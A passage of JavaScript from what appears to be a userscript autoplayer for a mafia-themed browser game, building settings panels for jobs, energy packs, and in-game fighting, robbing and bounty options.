  for (var i = 0, iLength=missions.length; i < iLength; ++i) {
    var mission = missions[i];
    if (mission[MISSION_CITY] != cityno) {
      // Add a row for the city.
      cityno = mission[MISSION_CITY];
      choiceM = makeElement('div');
      choiceM.innerHTML = '=== ' + cities[cityno][CITY_NAME].toUpperCase() + ' MISSIONS ===';
      choiceM.className = 'ap_optgroup1';
      selectMissionM.appendChild(choiceM);

      choiceTier = document.createElement('optgroup');
      choiceTier.label = cities[cityno][CITY_NAME].toUpperCase();
      choiceTier.className = 'ap_optgroup1';
      selectTier.appendChild(choiceTier);
    }
    if (mission[MISSION_TAB] != tabno) {
      // Add a row for the tab.
      tabno = mission[MISSION_TAB];
      choiceM = makeElement('div');
      choiceM.innerHTML = missionTabs[cityno][tabno - 1];
      choiceM.className = 'ap_optgroup2';
      selectMissionM.appendChild(choiceM);

      choiceTier = document.createElement('option');
      choiceTier.text = missionTabs[cityno][tabno - 1];
      choiceTier.value = cityno + '.' + tabno;
      selectTier.appendChild(choiceTier);
      if (GM_getValue('selectTier') == choiceTier.value) {
        choiceTier.selected = true;
      }
    }

    // Determine the job's experience-to-energy ratio.
    var ratio = isNaN(mission[MISSION_RATIO]) ? calcJobratio(i) : mission[MISSION_RATIO];

    // Add a row for the job.
    id = missions[i][MISSION_NAME];
    title = mission[MISSION_NAME] + ' (' + parseFloat(ratio) + ')';

    // Get the check state of the box
    var checkState = false;
    if (tmpListArray.indexOf(String(i)) != -1) {
      checkState = true;
    }

    // Multiple job choices
    if (mission[MISSION_TABPATH] == 0) divChoice = makeElement('div', null, {'class':'ap_option', 'chkid':id});
    else divChoice = makeElement('div', null, {'class':'ap_option', 'chkid':id, 'style':'color: red'});
    divChoice.addEventListener('click', chkHandler, false);
    makeElement('img', divChoice, {'style':'width: 15px; height: 15px;', 'id':'img' + id, 'src': checkState ? stripURI(checkedIcon) : stripURI(unCheckedIcon)});
    choiceM = makeElement('input', divChoice, {'type':'checkbox', 'id':id, 'title':title, 'style':'display: none', 'value':'checked'});
    choiceM.checked = checkState;
    divChoice.appendChild(document.createTextNode(' ' + title));
    selectMissionM.appendChild(divChoice);
  }

  // Uncheck ALL handler
  var unChkHandler = function () {
    var eltChoice;
    var eltChoiceImg;
    var eltId;
    for (var i = 0, iLength=missions.length; i < iLength; ++i) {
      eltId = missions[i][MISSION_NAME];
      eltChoice = document.getElementById(eltId);
      eltChoiceImg = document.getElementById('img' + eltId);
      if (eltChoiceImg && eltChoice.checked) eltChoiceImg.src = stripURI(unCheckedIcon);
      if (eltChoice && eltChoice.checked) eltChoice.checked = false;
    }
  };
  unChkAll.addEventListener('click', unChkHandler, false);

  makeElement('br', rhs, {'class':'hide'});
  id = 'skipfight';
  title = 'Check this to skip Fighting Style Jobs In Tier Mastery.';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id}).appendChild(document.createTextNode(' Skip Fighting In Job Tier Mastery '));

  // Spend buff packs?
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Spend buff packs:'));

  // Mini packs
  title = 'Periodically check for mini buffs.';
  id = 'checkMiniPack';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, 'checkMiniPack');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Mini packs '));

  // Energy packs
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Spend energy packs if it will not waste energy, as determined by the estimated job ratio setting and your stamina statistics.';
  id = 'autoEnergyPack';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, 'autoEnergyPack');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  title = 'Estimate the average experience-to-energy ratio of the jobs you will be performing. For example, a job that paid 10 experience points and required 5 energy would have a ratio of 2. Enter 0 if you prefer to have energy packs fire regardless of waste.';
  id = 'estimateJobRatio';
  label.appendChild(document.createTextNode(' Full packs @ ratio '));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'maxlength':4, 'style':'vertical-align:middle; width: 30px; border: #781351;', 'value':GM_getValue('estimateJobRatio', '2'), 'size':'1'});
  makeElement('br', rhs, {'class':'hide'});

  // Energy packs force
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Spend energy packs if you have less than the set amount of energy.';
  id = 'autoEnergyPackForce';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, 'autoEnergyPackForce');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  title = 'Amount of energy remaining to trigger the firing of the energy pack.';
  id = 'autoEnergyPackForcePts';
  label.appendChild(document.createTextNode(' Full packs @ points '));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'maxlength':4, 'style':'vertical-align:middle; width: 30px; border: #781351;', 'value':GM_getValue('autoEnergyPackForcePts', '0'), 'size':'1'});

  // Mastery items owned.
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});

  title = 'Check the mastery items you already own.',
  label = makeElement('label', lhs, {'title':title});
  label.appendChild(document.createTextNode('Job mastery items owned:'));

  // Maniac character type?
  title = 'Check this box if your character type is Maniac (as opposed to Fearless or Mogul).';
  id = 'isManiac';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Character type is Maniac '));

  makeElement('br', rhs, {'class':'hide'});

  title = 'Check this if you were awarded the Helicopter for mastering all Consigliere jobs.';
  id = 'hasHelicopter';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, 'hasHelicopter');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Helicopter  '));

  title = 'Check this if you were awarded the Golden Throne for mastering all Boss jobs.';
  id = 'hasGoldenThrone';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, 'hasGoldenThrone');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Golden Throne'));

// drop a few lines
  item = makeElement('div', list, {'class':'single'});

  // Spend energy option
  item = makeElement('div', list, {'class':'single'});
  title = 'Start spending energy For Jobs when energy level is reached';
  id = 'selectEnergyUse';
  item.appendChild(document.createTextNode('Start spending energy for jobs when '));
  makeElement('input', item, {'type':'text', 'id':id, 'title':title, 'style':'width: 2em; ', 'value':GM_getValue(id, '0')});
  id = 'selectEnergyUseMode';
  item.appendChild(document.createTextNode(' '));
  elt = makeElement('select', item, {'id':id, 'title':title});
  for (i = 0, iLength = numberSchemes.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(numberSchemes[i]));
    elt.appendChild(choice);
  }
  elt.selectedIndex = GM_getValue(id, 0);
  item.appendChild(document.createTextNode(' of energy has accumulated.'));

  // Energy to reserve jobs are not allowed to go below
  item = makeElement('div', list, {'class':'single'});
  title = 'Suspend automatic Job play below this level of energy.';
  title += '  NOTE: Mission & Job LOWER limits are completely INDEPENDENT Of Each Other.';
  id = 'selectEnergyKeep';
  item.appendChild(document.createTextNode('While Energy Is Below '));
  makeElement('input', item, {'type':'text', 'id':id, 'title':title, 'style':'width: 2em; ', 'value':GM_getValue(id, '0')});
  id = 'selectEnergyKeepMode';
  item.appendChild(document.createTextNode(' '));
  elt = makeElement('select', item, {'id':id, 'title':title});
  for (i = 0, iLength = numberSchemes.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(numberSchemes[i]));
    elt.appendChild(choice);
  }
  elt.selectedIndex = GM_getValue(id, 0);
  item.appendChild(document.createTextNode(' Suspend Energy Spending For Above Jobs.'));

// drop a few lines
  item = makeElement('div', list, {'class':'single'});

//  title = 'Start spending energy For Missions when energy level is reached      NOTE: these limits are COMPLETELY INDEPENDENT OF EACH OTHER

  // Energy to reserve for manual play
  item = makeElement('div', list, {'class':'single'});
  title = 'Suspend automatic missions below this level of energy.';
  title += '  NOTE: Mission & Job LOWER limits areLOWER limits are completely INDEPENDENT Of Each Other.';
  id = 'selectMissionEnergyKeep';  //  selectEnergyKeep
  item.appendChild(document.createTextNode('While Energy Is Below '));
  makeElement('input', item, {'type':'text', 'id':id, 'title':title, 'style':'width: 2em; ', 'value':GM_getValue(id, '0')});
  id = 'selectMissionEnergyKeepMode';  //  selectEnergyKeepMode
  item.appendChild(document.createTextNode(' '));
  elt = makeElement('select', item, {'id':id, 'title':title});
  for (i = 0, iLength = numberSchemes.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(numberSchemes[i]));
    elt.appendChild(choice);
  }
  elt.selectedIndex = GM_getValue(id, 0);
  item.appendChild(document.createTextNode(' Suspend Energy Spending For Missions.'));

  // Level up
  item = makeElement('div', list, {'class':'single'});
  title = 'Ignore minimum energy settings if a level up is within reach.';
  id = 'allowEnergyToLevelUp';
  makeElement('input', item, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', item, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Don\'t reserve energy if within reach of the next level.'));

  return energyTab;
}
// Create Stamina Tab
// Create Stamina Sub Tab Functions
function tabContainerDivs(subTab){
  item = makeElement('div', subTab);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
}

function removeStrongerOpponents(staminaTabSub){
  tabContainerDivs(staminaTabSub);
  title = 'Remove stronger opponents from the list automatically.';
  id = 'fightRemoveStronger';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, 'fightRemoveStronger', 'checked');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Remove stronger opponents'));
}

// Create Stamina Sub Tabs
function createStaminaSubTab_FightRandom(staminaTabSub) {

  // Location setting
  tabContainerDivs(staminaTabSub);
  makeElement('label', lhs).appendChild(document.createTextNode('Fight in: '));
  id = 'fightRandomLoc';
  var fightRandomLoc = makeElement('select', lhs, {'id':id});
  for (i = 0, iLength=fightLocations.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(fightLocations[i]));
    fightRandomLoc.appendChild(choice);
  }
  fightRandomLoc.selectedIndex = GM_getValue('fightLocation', NY);

  //rehit on money gain
  title = 'Reattack until iced if money gained';
  id = 'staminaReattack';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title,'style':'margin-left: 0.5em;'});
  label.appendChild(document.createTextNode('While gaining $ '));
  //Money gain treshold
  title = 'Reattack if this amount is gained';
  id = 'reattackThreshold';
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'maxlength':6, 'style':'width: 45px; border: 1px solid #781351;', 'value':GM_getValue(id, '65000'), 'size':'1'});
  label = makeElement('label', rhs, {'for':id, 'title':title,'style':'margin-left: 0.5em;'});

  // IceCheck
  title = 'Attack ONLY live targets';
  id = 'iceCheck';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'iceCheck');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Skip iced targets'));

  // Powerattack
  title = 'Power Attack';
  id = 'staminaPowerattack';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title,'style':'margin-left: 0.5em;'});
  label.appendChild(document.createTextNode('Powerattack'));

  // Maximum level.
  tabContainerDivs(staminaTabSub);
  title = 'Avoid opponents higher than this level.';
  id = 'fightLevelMax';
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Maximum level:'));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'maxlength':5, 'style':'width: 30px; border: 1px solid #781351;', 'value':GM_getValue('fightLevelMax', '100'), 'size':'1'});

  // Maximum level relative?
  title = 'Make the maximum level be relative to your own. For example, if your level is 10, and maximum level is set to 5, opponents higher than level 15 will be avoided.';
  id = 'fightLevelMaxRelative';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'fightLevelMaxRelative');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Add my level'));

 // Override my level check?
  title = 'Override the check for level to be the same or greater than my level - CAUTION: might cause slow fighting.';
  id = 'fightLevelMaxOverride';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'fightLevelMaxOverride');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Override level check'));

  // Maximum mafia size.
  tabContainerDivs(staminaTabSub);
  id = 'fightMafiaMax';
  title = 'Avoid opponents with mafia sizes larger than this.',
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Maximum mafia:'));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'style':'width: 30px; border: 1px solid #781351;', 'value':GM_getValue('fightMafiaMax', '501'), 'size':'1'});

  // Maximum mafia relative?
  title = 'Make the maximum mafia size be relative to your own. For example, if you have 300 mafia members, and maximum mafia is set to 50, opponents with more than 350 mafia members will be avoided.';
  id = 'fightMafiaMaxRelative';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'fightMafiaMaxRelative');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Add my mafia size'));

  // Minimum mafia size.
  tabContainerDivs(staminaTabSub);
  id = 'fightMafiaMin';
  title = 'Avoid opponents with mafia sizes smaller than this.',
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Minimum mafia:'));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'style':'width: 30px; border: 1px solid #781351;', 'value':GM_getValue('fightMafiaMin', '1'), 'size':'1'});

  // Minimum mafia relative?
  title = 'Make the minimum mafia size be relative to your own. For example, if you have 300 mafia members, and minimum mafia is set to 50, opponents with less than 250 mafia members will be avoided.';
  id = 'fightMafiaMinRelative';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'fightMafiaMinRelative');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Subtract from my mafia size'));

  // Mob fight
  tabContainerDivs(staminaTabSub);
  title = 'Fight higher levels if the mafia is smaller.  You mob them, overwhelm the smaller numbers';
  id = 'fightMobMode';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, 'fightMobMode');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Mob Fight'));

  // Remove stronger opponents?
  removeStrongerOpponents(staminaTabSub);
  tabContainerDivs(staminaTabSub);

  // Pattern Fighting ?
  title = ' Use Mafia Family Patterns when fighting';
  id = 'fightNames';
  var UseFightNames = makeElement('input', lhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(' Use Patterns when fighting:'));
  UseFightNames.addEventListener('click', clickUseFightNames, false);
  makeElement('br', lhs);
  id = 'fightAvoidNames';
  title = ' Avoid mafia families';
  makeElement('input', lhs, {'type':'radio', 'name':'rm3', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(title));
  makeElement('br', lhs);
  id = 'fightOnlyNames';
  title = ' Only Fight Mafia Families ';
  makeElement('input', lhs, {'type':'radio', 'name':'rm3', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(title));
  makeElement('textarea', rhs, {'style':'position: static; width: 15em; height: 6em;', 'id':'fightClanName', 'title':'Enter each pattern (such as a clan name) on a separate line.'}).appendChild(document.createTextNode(GM_getValue('fightClanName', defaultClans.join('\n'))));
  makeElement('br', rhs);
  makeElement('font', rhs, {'style':'font-size: 10px;'}).appendChild(document.createTextNode('Enter each name pattern on a separate line.'));

  // Use stealth fighting?
  tabContainerDivs(staminaTabSub);
  title = 'Prefer opponents who won\'t be notified of your attacks.';
  id = 'fightStealth';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, 'fightStealth');
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Use fight stealth'));
}
/*

//STAMINA_HOW_LVJOBFIGHT
// Create Stamina Sub Tabs
function createStaminaSubTab_LVJobFight(staminaTabSub) {
}
*/

function createStaminaSubTab_FightSpecific(staminaTabSub) {

  // Location setting
  tabContainerDivs(staminaTabSub);
  makeElement('label', lhs).appendChild(document.createTextNode('Fight in: '));
  id = 'fightListLoc';
  var fightListLoc = makeElement('select', lhs, {'id':id});
  for (i = 0, iLength=fightLocations.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(fightLocations[i]));
    fightListLoc.appendChild(choice);
  }
  fightListLoc.selectedIndex = GM_getValue('fightLocation', NY);

  //rehit on money gain
  title = 'Reattack until iced if money gained';
  id = 'staminaReattackList';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title,'style':'margin-left: 0.5em;'});
  label.appendChild(document.createTextNode('While gaining $ '));
  //Money gain treshold
  title = 'Reattack if this amount is gained';
  id = 'reattackThresholdList';
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'maxlength':6, 'style':'width: 45px; border: 1px solid #781351;', 'value':GM_getValue(id, '65000'), 'size':'1'});
  label = makeElement('label', rhs, {'for':id, 'title':title,'style':'margin-left: 0.5em;'});

  // IceCheck
  title = 'Attack ONLY live targets';
  id = 'iceCheck';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'iceCheck');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Skip iced targets'));

  // Powerattack
  title = 'Power Attack';
  id = 'staminaPowerattack';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title,'style':'margin-left: 0.5em;'});
  label.appendChild(document.createTextNode('Powerattack'));

  // Opponent list
  tabContainerDivs(staminaTabSub);
  lhs.appendChild(document.createTextNode('Fight these opponents:'));
  makeElement('textarea', rhs, {'style':'position: static; width: 180px; height: 105px;', 'id':'pfightlist', 'title':'Enter each opponent\'s ID (not their name) on a separate line.'}).appendChild(document.createTextNode(GM_getValue('pfightlist', '')));
  makeElement('br', rhs);
  makeElement('font', rhs, {'style':'font-size: 10px;'}).appendChild(document.createTextNode('Enter each target on a separate line. Add the userid part of the p|userid.'));

  // Remove stronger opponents?
  removeStrongerOpponents(staminaTabSub);
}

function createStaminaSubTab_FightRob(staminaTabSub) {
  createStaminaSubTab_Rob(staminaTabSub);
  makeElement('hr', staminaTabSub);
  createStaminaSubTab_FightRandom(staminaTabSub);
}

function createStaminaSubTab_FightRivals_Rob(staminaTabSub) {
  createStaminaSubTab_Rob(staminaTabSub);
  makeElement('hr', staminaTabSub);
  createStaminaSubTab_FightRivals(staminaTabSub);
}

function createStaminaSubTab_Rob(staminaTabSub) {
  // Location setting
  tabContainerDivs(staminaTabSub);
  lhs.appendChild(document.createTextNode('Rob in:'));
  id = 'robLocation';
  var robLocation = makeElement('select', rhs, {'id':id});
  for (i = 0, iLength=locations.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(locations[i]));
    robLocation.appendChild(choice);
  }
  robLocation.selectedIndex = GM_getValue('robLocation', NY);

  // Fast Rob
  title = 'Fast rob, does not log';
  id = 'fastRob';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked', 'style': 'margin-left: 10px;'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Fast Rob?'));

}

function createStaminaSubTab_CollectBounties(staminaTabSub) {

  // Location setting
  tabContainerDivs(staminaTabSub);
  lhs.appendChild(document.createTextNode('Collect bounties in:'));
  id = 'hitmanLocation';
  var hitmanLoc = makeElement('select', rhs, {'id':id});
  for (i = 0, iLength=locations.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(locations[i]));
    hitmanLoc.appendChild(choice);
  }
  hitmanLoc.selectedIndex = GM_getValue('hitmanLocation', NY);

  // Minimum bounty
  tabContainerDivs(staminaTabSub);
  id = 'hitmanBountyMin';
  title = 'Ignore targets with bounties below this measly amount.',
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Minimum bounty:'));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'style':'width: 7em; border: 1px solid #781351;', 'value':GM_getValue('hitmanBountyMin', '0')});

  // Bounty selection
  tabContainerDivs(staminaTabSub);
  lhs.appendChild(document.createTextNode('Prefer targets with:'));
  id = 'bountySelection';
  var bountySelection = makeElement('select', rhs, {'id':id});
  for (i = 0, iLength=bountySelectionChoices.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(bountySelectionChoices[i]));
    bountySelection.appendChild(choice);
  }
  bountySelection.selectedIndex = GM_getValue('bountySelection', BOUNTY_HIGHEST_BOUNTY);

  tabContainerDivs(staminaTabSub);

  // Pattern Fighting ?
  title = ' Use Mafia Family Patterns for collecting bounties';
  id = 'hitmanNames';
  var UseHitmanNames = makeElement('input', lhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(' Use Patterns when collecting:'));
  UseHitmanNames.addEventListener('click', clickUseHitmanNames, false);
  makeElement('br', lhs);
  id = 'hitmanAvoidNames';
  title = ' Avoid mafia families';
  makeElement('input', lhs, {'type':'radio', 'name':'rm3', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(title));
  makeElement('br', lhs);
  id = 'hitmanOnlyNames';
  title = ' Only Fight Mafia Families ';
  makeElement('input', lhs, {'type':'radio', 'name':'rm3', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(title));

  makeElement('textarea', rhs, {'style':'position: static; width: 15em; height: 6em;', 'id':'hitmanClanName', 'title':'Enter each pattern (such as a clan name) on a separate line.'}).appendChild(document.createTextNode(GM_getValue('hitmanClanName', defaultClans.join('\n'))));
  makeElement('br', rhs);
  makeElement('font', rhs, {'style':'font-size: 10px;'}).appendChild(document.createTextNode('Enter each name pattern on a separate line.'));

  // Remove stronger opponents?
  removeStrongerOpponents(staminaTabSub);
}

function createStaminaSubTab_SetBounties(staminaTabSub) {

  // Location setting
  tabContainerDivs(staminaTabSub);
  lhs.appendChild(document.createTextNode('Place bounties in:'));
  id = 'autoHitListLoc';
  var autoHitListLoc = makeElement('select', rhs, {'id':id});
  for (i = 0, iLength=locations.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(locations[i]));
    autoHitListLoc.appendChild(choice);
  }
  autoHitListLoc.selectedIndex = GM_getValue('autoHitListLoc', NY);

  title = 'Set Bounties in background';
  id = 'bgAutoHitCheck';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'bgAutoHitCheck');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Enable Background mode'));

  // Bounty amount
  tabContainerDivs(staminaTabSub);
  id = 'autoHitListBounty';
  title = 'Place a fixed bounty or check random',
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Bounty:'));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'style':'width: 7em; border: 1px solid #781351;', 'value':GM_getValue('autoHitListBounty', '0')});

  title = 'Place Random Bounties';
  id = 'autoHitListRandom';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'autoHitListRandom');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' random'));

  // Opponent list
  tabContainerDivs(staminaTabSub);
  lhs.appendChild(document.createTextNode('Hitlist these opponents:'));
  makeElement('textarea', rhs, {'style':'position: static; width: 180px; height: 105px;', 'id':'pautoHitOpponentList', 'title':'Enter each opponent\'s ID (not their name) on a separate line.'}).appendChild(document.createTextNode(GM_getValue('pautoHitOpponentList', '')));
  makeElement('br', rhs);
  makeElement('font', rhs, {'style':'font-size: 10px;'}).appendChild(document.createTextNode('Enter each target on a separate line. Add the userid part of the p|userid.'));
}

function createStaminaSubTab_Random(staminaTabSub) {
  // Stamina Spend choice setting
  var SpendModes = GM_getValue('randomSpendModes');
  if(!SpendModes) SpendModes="10000000";
  var item = makeElement('div', staminaTabSub, {'style':'margin-left:0.5em;'});
  item.appendChild(document.createTextNode('Stamina Spend Modes :'+SpendModes));
  makeElement('br', item);

  title ="Stamina Spend Choice selection";
  name = 'randomSpendModes[]';
  for (i = 0, iLength=randomSpendChoices.length; i < iLength; ++i) {
    if(randomSpendChoices[i]) {
      if(SpendModes[i]!='0'){
        makeElement('input', item, {'type':'checkbox', 'name':name, 'title':randomSpendChoices[i], 'style':'margin-left: 0.5em;margin-right: 0.5em;', 'value':SpendModes[i], 'checked':'checked'});
      } else {
        makeElement('input', item, {'type':'checkbox', 'name':name, 'title':randomSpendChoices[i], 'style':'margin-left: 0.5em;margin-right: 0.5em;', 'value':SpendModes[i]});
      }
      label = makeElement('label', item, {'for':name, 'title':title});
      label.appendChild(document.createTextNode(randomSpendChoices[i]));
    } else {
      makeElement('input', item, {'type':'checkbox', 'name':name, 'title':'invalid option', 'style':'display:none;', 'value':'0'});
    }
  }
  makeElement('br', item);

  // Location setting for Fighting
  var fightCities = GM_getValue('randomFightLocations');
  if(!fightCities) fightCities="10000";
  var item = makeElement('div', staminaTabSub, {'style':'margin-left:0.5em;margin-top:1em;'});
  item.appendChild(document.createTextNode('Location Settings :'));
  makeElement('br', item);
  item.appendChild(document.createTextNode('Fight in:'));
  makeElement('br', item);
  title ="Fighting cities selection";
  name = 'randomFightLocations[]';
  for (i = 0, iLength=randomLocations.length; i < iLength; ++i) {
    if(fightCities[i]=='1')
      makeElement('input', item, {'type':'checkbox', 'name':name, 'title':locations[i], 'style':'margin-left: 0.5em;margin-right: 0.5em;', 'value':locations[i], 'checked':'checked'});
    else makeElement('input', item, {'type':'checkbox', 'name':name, 'title':locations[i], 'style':'margin-left: 0.5em;margin-right: 0.5em;', 'value':locations[i]});
    label = makeElement('label', item, {'for':name, 'title':title});
    label.appendChild(document.createTextNode(locations[i]));
  }
  makeElement('br', item);

  // Location setting for Robbing
  var robCities = GM_getValue('randomRobLocations');
  if(!robCities) robCities="10000";
  var item = makeElement('div', staminaTabSub, {'style':'margin-left:0.5em;'});
  item.appendChild(document.createTextNode('Rob in:'));
  makeElement('br', item);
  title ="Robbing cities selection";
  name = 'randomRobLocations[]';
  for (i = 0, iLength=randomLocations.length; i < iLength; ++i) {
    if(robCities[i]=='1')
      makeElement('input', item, {'type':'checkbox', 'name':name, 'title':locations[i], 'style':'margin-left: 0.5em;margin-right: 0.5em;', 'value':locations[i], 'checked':'checked'});
    else makeElement('input', item, {'type':'checkbox', 'name':name, 'title':locations[i], 'style':'margin-left: 0.5em;margin-right: 0.5em;', 'value':locations[i]});
    label = makeElement('label', item, {'for':name, 'title':title});
    label.appendChild(document.createTextNode(locations[i]));
  }
  makeElement('br', item);

  // Location setting for Bounty Collection
  var hitCities = GM_getValue('randomHitmanLocations');
  if(!hitCities) hitCities="10000";
  var item = makeElement('div', staminaTabSub, {'style':'margin-left:0.5em;'});
  item.appendChild(document.createTextNode('Collect Bounties in:'));
  makeElement('br', item);
  title ="Hitman cities selection";
  name = 'randomHitmanLocations[]';
  for (i = 0, iLength=randomLocations.length; i < iLength; ++i) {
    if(hitCities[i]=='1')
      makeElement('input', item, {'type':'checkbox', 'name':name, 'title':locations[i], 'style':'margin-left: 0.5em;margin-right: 0.5em;', 'value':locations[i], 'checked':'checked'});
